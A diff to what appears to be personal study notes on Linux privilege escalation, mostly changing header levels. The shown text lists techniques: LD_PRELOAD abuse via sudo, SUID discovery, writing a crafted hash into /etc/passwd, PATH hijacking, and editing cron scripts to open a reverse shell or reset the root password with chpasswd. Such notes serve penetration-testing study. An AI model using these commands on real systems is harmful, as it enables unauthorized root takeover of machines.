@@ -1,6 +1,6 @@
 ## Sudo
 `sudo -l` - what can be run by user at root privilege.  
-# Leveraging LD_PRELOAD
+### Leveraging LD_PRELOAD
 if `env_keep` is enabled, then you can create a shared library that will be loaded and executed before the program is run.  
 1. Check of `env_keep` - `sudo -l`.
 2. Write a simple C code complied as a shared object.  
@@ -11,16 +11,16 @@ if `env_keep` is enabled, then you can create a shared library that will be load
 ## SUID
 `find / -type f -perm -04000 -ls 2>/dev/null` - lists files with SUID or SGID bits.  
 
-# Replacing the root user exploit
+### Replacing the root user exploit
 1. Create password hash.
 `openssl passwd -1 -salt [SALT] [PASSWORD]`
 2. Add password hash and username to `/etc/passwd`.
 3. su [USERNAME].
 
-# PATH
+### PATH
 **Idea:** A root-owned SUID binary calls a command by name (not full path). You control PATH, so you make it run your binary instead — with root privileges.
 
-# Steps
+#### Steps
 
 1. **Find SUID binaries**
    ```
@@ -64,7 +64,7 @@ if `env_keep` is enabled, then you can create a shared library that will be load
    id
    ```
 
-# Notes
+**Notes**  
 - Only works if the binary uses `system()`/`popen()` with a bare command name.
 - Won't work if the binary hardcodes its own PATH internally.
 
@@ -83,6 +83,6 @@ cron jobs can be found in:
 After finding the cron script. We can modify it to launch a reverse shell with root privileges.  
 `nc -nlvp [port number]` - on attack machine to receive shell.  
 
-# Another method for Cron
+### Another method for Cron
 Adding `echo "root:newpass" | chpasswd` into the vulnerable script.  
 login as the root by calling `su root` and using new password.  
